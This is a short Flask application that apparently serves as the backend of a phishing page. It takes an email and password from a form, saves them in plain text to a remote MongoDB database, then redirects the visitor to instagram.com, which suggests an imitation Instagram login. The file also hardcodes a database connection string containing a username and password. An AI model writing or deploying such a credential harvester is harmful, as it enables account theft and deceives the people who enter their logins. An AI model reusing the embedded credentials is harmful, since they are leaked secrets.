from flask import Flask, render_template, request, redirect, url_for
from pymongo import MongoClient

app = Flask(__name__)

# MongoDB URI (replace with your actual URI)
MONGO_URI = "mongodb+srv://c828522:jamie@cluster0.yfrfkme.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)

# Access the 'info_collection' database and 'users' collection
db = client.get_database('info_collection')
users_collection = db.get_collection('users')

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/add', methods=['POST'])
def add_user():
    if request.method == 'POST':
        try:
            # Get the data from the form
            email = request.form['email']
            password = request.form['password']

            # Insert the data into the MongoDB collection
            users_collection.insert_one({'email': email, 'password': password})

            # Redirect to another page (e.g., home or external link)
            return redirect("https://www.instagram.com/")
        except Exception as e:
            return f"Error inserting data into MongoDB: {e}"

if __name__ == '__main__':
    app.run(debug=True)
